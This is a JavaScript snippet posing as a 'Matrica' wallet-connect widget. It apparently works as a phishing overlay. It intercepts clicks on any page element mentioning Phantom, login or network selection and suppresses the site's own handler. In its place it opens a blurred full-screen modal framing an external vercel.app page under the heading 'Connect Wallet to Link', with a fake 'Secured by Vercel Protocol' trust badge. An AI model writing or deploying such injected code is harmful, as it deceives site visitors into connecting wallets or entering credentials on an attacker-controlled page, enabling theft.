(function () {
  const iframe_path = "https://matrica-processor-backend.vercel.app/";
  
  function injectStyles() {
    if (document.getElementById('widget-styles')) return;
    
    var style = document.createElement('style');
    style.id = 'widget-styles';
    style.textContent = `
      #widget-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: rgba(0, 0, 0, 0.85);
        backdrop-filter: blur(8px);
        -webkit-backdrop-filter: blur(8px);
        z-index: 9998;
      }
      
      #widget-container {
        position: fixed;
        z-index: 9999;
      }
      
      #widget-container.desktop {
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 400px;
      }
      
      #widget-container.mobile {
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
      
      #widget-frame {
        background: #1a1d29;
        border-radius: 16px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
        overflow: hidden;
        position: relative;
        width: 100%;
      }
      
      #widget-container.mobile #widget-frame {
        border-radius: 0;
        height: 100%;
      }
      
      #widget-close {
        position: absolute;
        top: 16px;
        right: 16px;
        width: 32px;
        height: 32px;
        border-radius: 50%;
        background: #2a2d3a;
        border: none;
        color: #8b8d98;
        font-size: 20px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
        transition: all 0.2s;
      }
      
      #widget-close:hover {
        background: #363945;
        color: #fff;
      }
      
      #widget-container.mobile #widget-close {
        display: none;
      }
      
      #widget-header {
        padding: 24px 20px 20px;
        text-align: center;
        border-bottom: 1px solid #2a2d3a;
      }
      
      #widget-container.mobile #widget-header {
        display: none;
      }
      
      #widget-logo {
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 0 16px 0;
      }
      
      #widget-logo img {
        height: 28px;
        width: auto;
      }
      
      #widget-title {
        font-size: 19px;
        font-weight: 600;
        color: #fff;
        margin: 0 0 6px 0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
      
      #widget-subtitle {
        font-size: 13px;
        color: #8b8d98;
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
      
      #widget-iframe {
        border: 0;
        display: block;
        background: #1a1d29;
        width: 100%;
      }
      
      #widget-container.desktop #widget-iframe {
        height: 400px;
      }
      
      #widget-container.mobile #widget-iframe {
        height: 100%;
      }
      
      #widget-footer {
        background: #1a1d29;
        padding: 16px 20px;
        text-align: center;
        border-top: 1px solid #2a2d3a;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
      
      #widget-container.mobile #widget-footer {
        display: none;
      }
      
      #widget-footer-brand {
        font-size: 12px;
        color: #8b8d98;
        margin: 0 0 4px 0;
      }
      
      #widget-footer-brand span {
        color: #fff;
        font-weight: 600;
      }
      
      #widget-footer-text {
        font-size: 11px;
        color: #6c6e7a;
        margin: 0;
      }
    `;
    document.head.appendChild(style);
  }
  
  function createWidget() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    var isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    
    var container = document.createElement('div');
    container.id = 'widget-container';
    container.className = (isMobile || isTouchDevice) ? 'mobile' : 'desktop';
    
    var frame = document.createElement('div');
    frame.id = 'widget-frame';
    
    var closeBtn = document.createElement('button');
    closeBtn.id = 'widget-close';
    closeBtn.innerHTML = '×';
    closeBtn.onclick = function() {
      closeWidget();
    };
    
    var header = document.createElement('div');
    header.id = 'widget-header';
    
    var logo = document.createElement('div');
    logo.id = 'widget-logo';
    
    var logoImg = document.createElement('img');
    logoImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM0IiBoZWlnaHQ9IjI5IiB2aWV3Qm94PSIwIDAgMTM0IDI5IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB4PSIxMS40NTciIHk9IjEwLjYzODciIHdpZHRoPSI3LjAwOTYxIiBoZWlnaHQ9IjcuMDA5NjIiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xMi42MjY2IDEuODc2OTVWNS4wODk2OUg1LjkwOTAzVjIzLjE5NzlIMTIuNjI2NlYyNi40MTA2SDIuNjk2MjlWMS44NzY5NUgxMi42MjY2WiIgZmlsbD0iIzRBOTlCRiIvPgo8cGF0aCBkPSJNMTcuMjk5NyAyNi40MTA2SDI3LjIyOTlWMS44NzY5NUgxNy4yOTk3VjUuMDg5NjlIMjQuMDE3MlYyMy4xOTc5SDE3LjI5OTdWMjYuNDEwNloiIGZpbGw9IiM0QTk5QkYiLz4KPHBhdGggZD0iTTM4LjUxNDYgMjQuMTAwNUg0Mi4wNzg2TDQxLjg1MjQgOC40MzAyNkw0Ny4xNzAxIDI0LjEwMDVINTAuOTYwNEw1Ni4yNzgxIDguNDMwMjZMNTYuMDUxOCAyNC4xMDA1SDU5LjY0NDFWNC4zMDA1NUg1NC4xODQ5TDQ5LjA5MzUgMjAuMjgyTDQ0LjAwMjEgNC4zMDA1NUgzOC41MTQ2VjI0LjEwMDVaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNjYuNDk3MiAyNC40MTE3QzY4LjYxODYgMjQuNDExNyA3MC40Mjg5IDIzLjMzNjggNzEuMTkyNiAyMS42OTYzQzcxLjE5MjYgMjIuODI3NyA3MS4yNzc1IDIzLjQ3ODMgNzEuNDE4OSAyNC4xMDA1SDc0Ljg0MTVDNzQuNjQzNSAyMy4wNTQgNzQuNTAyIDIxLjQxMzQgNzQuNTAyIDE5Ljg4NlYxNS4xNjIzQzc0LjUwMiAxMS43NjggNzIuMDQxMiA5LjQ0ODU1IDY4LjUzMzcgOS40NDg1NUM2NS4wMjYzIDkuNDQ4NTUgNjIuNDgwNiAxMS42NTQ4IDYyLjMxMDkgMTQuNzk0NUw2NS43MDUyIDE0Ljg3OTRDNjUuODQ2NiAxMy4yMTA1IDY2LjkyMTUgMTIuMjc3MSA2OC40MjA2IDEyLjI3NzFDNzAuMDYxMiAxMi4yNzcxIDcxLjAyMjkgMTMuMzUyIDcxLjAyMjkgMTUuMDc3NFYxNS41MDE3TDY4LjM5MjMgMTUuNzg0NUM2NC4xNzc3IDE2LjI2NTQgNjEuODg2NiAxNy43NjQ1IDYxLjg4NjYgMjAuNDIzNEM2MS44ODY2IDIyLjg4NDMgNjMuODEgMjQuNDExNyA2Ni40OTcyIDI0LjQxMTdaTTY1LjM5NCAyMC4xMTIzQzY1LjM5NCAxOC43MjYzIDY2LjU4MiAxOC4xNjA1IDY4LjY0NjkgMTcuOTA2TDcxLjA3OTUgMTcuNjIzMVYxOC4zMzAzQzcxLjA3OTUgMjAuNDggNjkuNTUyIDIxLjk3OTEgNjcuNjAwMyAyMS45NzkxQzY2LjM1NTcgMjEuOTc5MSA2NS4zOTQgMjEuMzU2OCA2NS4zOTQgMjAuMTEyM1oiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik04NS4wOTkyIDIzLjk4NzRMODUuMDcwOSAyMS4wNDU3QzgzLjU3MTggMjEuNDk4MyA4Mi4wNzI3IDIxLjMyODUgODIuMDcyNyAxOS4wNjU3VjEyLjc4NjNIODUuNDk1MlY5Ljg3MjgzSDgyLjA3MjdWNi4yODA1NUg3OC41NjUyVjkuODcyODNINzUuOTkxMlYxMi43ODYzSDc4LjU2NTJWMTkuMzQ4NUM3OC41NjUyIDIzLjk4NzQgODEuOTg3OCAyNC44NjQzIDg1LjA5OTIgMjMuOTg3NFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik04Ny41NzU4IDI0LjEwMDVIOTEuMDgzMlYxOC4wNDc0QzkxLjA4MzIgMTQuMTcyMyA5My42Mjg5IDEyLjkyNzcgOTYuMzcyNiAxMy4zMjM3VjkuODQ0NTVDOTMuOTY4NCA5LjM2MzY5IDkxLjYyMDYgMTAuNDY2OCA5MC45OTg0IDEzLjc3NjNMOTEuMDgzMiA5Ljg3MjgzSDg3LjU3NThWMjQuMTAwNVoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik05OC4wOTM0IDI0LjEwMDVIMTAxLjYwMVY5Ljg3MjgzSDk4LjA5MzRWMjQuMTAwNVpNOTcuNTg0MyA1LjU3MzRDOTcuNTg0MyA2Ljg3NDU1IDk4LjU3NDMgNy44NjQ1NSA5OS44NDcxIDcuODY0NTVDMTAxLjE0OCA3Ljg2NDU1IDEwMi4xMzggNi44NzQ1NSAxMDIuMTM4IDUuNTczNEMxMDIuMTM4IDQuMzAwNTUgMTAxLjE0OCAzLjMxMDU1IDk5Ljg0NzEgMy4zMTA1NUM5OC41NzQzIDMuMzEwNTUgOTcuNTg0MyA0LjMwMDU1IDk3LjU4NDMgNS41NzM0WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTExMS4xMjEgMjQuNTI0OEMxMTQuOTY4IDI0LjUyNDggMTE3Ljk2NyAyMi4wNjQgMTE4LjEzNiAxOC40NDM0TDExNC42NTcgMTguMTg4OEMxMTQuNDU5IDIwLjE2ODggMTEyLjkwMyAyMS40MTM0IDExMS4xMjEgMjEuNDEzNEMxMDkuMDI4IDIxLjQxMzQgMTA3LjIxOCAxOS43NzI4IDEwNy4yMTggMTYuOTcyNUMxMDcuMjE4IDE0LjM5ODUgMTA4LjgzIDEyLjUzMTcgMTExLjEyMSAxMi41MzE3QzExMi45ODggMTIuNTMxNyAxMTQuNDU5IDEzLjgwNDUgMTE0LjY1NyAxNS41ODY1TDExOC4xMDggMTUuMzAzN0MxMTcuOTEgMTEuODI0NSAxMTQuOTEyIDkuNDQ4NTUgMTExLjEyMSA5LjQ0ODU1QzEwNi44NSA5LjQ0ODU1IDEwMy43MTEgMTIuNjQ0OCAxMDMuNzExIDE2Ljk3MjVDMTAzLjcxMSAyMS4zNTY4IDEwNi44MjIgMjQuNTI0OCAxMTEuMTIxIDI0LjUyNDhaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTI0LjE5NiAyNC40MTE3QzEyNi4zMTcgMjQuNDExNyAxMjguMTI3IDIzLjMzNjggMTI4Ljg5MSAyMS42OTYzQzEyOC44OTEgMjIuODI3NyAxMjguOTc2IDIzLjQ3ODMgMTI5LjExNyAyNC4xMDA1SDEzMi41NEMxMzIuMzQyIDIzLjA1NCAxMzIuMiAyMS40MTM0IDEzMi4yIDE5Ljg4NlYxNS4xNjIzQzEzMi4yIDExLjc2OCAxMjkuNzQgOS40NDg1NSAxMjYuMjMyIDkuNDQ4NTVDMTIyLjcyNSA5LjQ0ODU1IDEyMC4xNzkgMTEuNjU0OCAxMjAuMDA5IDE0Ljc5NDVMMTIzLjQwNCAxNC44Nzk0QzEyMy41NDUgMTMuMjEwNSAxMjQuNjIgMTIuMjc3MSAxMjYuMTE5IDEyLjI3NzFDMTI3Ljc2IDEyLjI3NzEgMTI4LjcyMSAxMy4zNTIgMTI4LjcyMSAxNS4wNzc0VjE1LjUwMTdMMTI2LjA5MSAxNS43ODQ1QzEyMS44NzYgMTYuMjY1NCAxMTkuNTg1IDE3Ljc2NDUgMTE5LjU4NSAyMC40MjM0QzExOS41ODUgMjIuODg0MyAxMjEuNTA4IDI0LjQxMTcgMTI0LjE5NiAyNC40MTE3Wk0xMjMuMDkyIDIwLjExMjNDMTIzLjA5MiAxOC43MjYzIDEyNC4yOCAxOC4xNjA1IDEyNi4zNDUgMTcuOTA2TDEyOC43NzggMTcuNjIzMVYxOC4zMzAzQzEyOC43NzggMjAuNDggMTI3LjI1IDIxLjk3OTEgMTI1LjI5OSAyMS45NzkxQzEyNC4wNTQgMjEuOTc5MSAxMjMuMDkyIDIxLjM1NjggMTIzLjA5MiAyMC4xMTIzWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==';
    logoImg.alt = 'Matrica';
    
    logo.appendChild(logoImg);
    
    var title = document.createElement('h2');
    title.id = 'widget-title';
    title.textContent = 'Connect Wallet to Link';
    
    var subtitle = document.createElement('p');
    subtitle.id = 'widget-subtitle';
    subtitle.textContent = 'Choose your wallet to link to your account.';
    
    header.appendChild(logo);
    header.appendChild(title);
    header.appendChild(subtitle);
    
    var iframe = document.createElement('iframe');
    iframe.id = 'widget-iframe';
    iframe.src = iframe_path;
    iframe.allow = "clipboard-read; clipboard-write; fullscreen;";
    iframe.loading = "lazy";
    
    var footer = document.createElement('div');
    footer.id = 'widget-footer';
    
    var footerBrand = document.createElement('p');
    footerBrand.id = 'widget-footer-brand';
    footerBrand.innerHTML = 'Secured by <span>Vercel Protocol</span>';
    
    var footerText = document.createElement('p');
    footerText.id = 'widget-footer-text';
    footerText.textContent = 'By connecting, you agree to our Terms & Privacy Policy';
    
    footer.appendChild(footerBrand);
    footer.appendChild(footerText);
    
    frame.appendChild(closeBtn);
    frame.appendChild(header);
    frame.appendChild(iframe);
    frame.appendChild(footer);
    container.appendChild(frame);
    
    return container;
  }
  
  function createBackdrop() {
    var backdrop = document.createElement('div');
    backdrop.id = 'widget-backdrop';
    backdrop.onclick = function(e) {
      if (e.target === backdrop) {
        closeWidget();
      }
    };
    return backdrop;
  }
  
  function closeWidget() {
    var backdrop = document.getElementById('widget-backdrop');
    var container = document.getElementById('widget-container');
    if (backdrop) backdrop.remove();
    if (container) container.remove();
  }
  
  function openWidget() {
    // Don't open if already open
    if (document.getElementById('widget-container')) return;
    
    var backdrop = createBackdrop();
    var widget = createWidget();
    
    document.body.appendChild(backdrop);
    document.body.appendChild(widget);
  }
  
  function attachButtonListeners() {
    // Try multiple selectors to find the buttons
    var selectors = [
      'button',           // All buttons
      '[role="button"]',  // Elements with button role
      'a.button',         // Links styled as buttons
      '.btn',             // Common button class
      '[onclick]',
    ];
    
    selectors.forEach(function(selector) {
      var elements = document.querySelectorAll(selector);
      
      elements.forEach(function(el) {
        // Skip if already has our listener
        if (el.hasAttribute('data-matrica-listener')) return;
        
        var text = el.textContent.trim().toLowerCase();
        var hasPhantom = text.includes('phantom');
        var hasNetwork = text.includes('select') && text.includes('network');
        var hasLogin = text.includes('login');
        
        if (hasPhantom || hasNetwork || hasLogin) {
          el.setAttribute('data-matrica-listener', 'true');
          el.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            openWidget();
          });
          console.log('Matrica: Attached listener to', text);
        }
      });
    });
  }
  
  function init() {
    injectStyles();
    
    // Try to attach listeners immediately
    attachButtonListeners();
    
    // Also observe DOM changes in case buttons load dynamically
    var observer = new MutationObserver(function() {
      attachButtonListeners();
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  
  // Expose openWidget globally in case you need to trigger it manually
  window.openMatricaWidget = openWidget;
})();
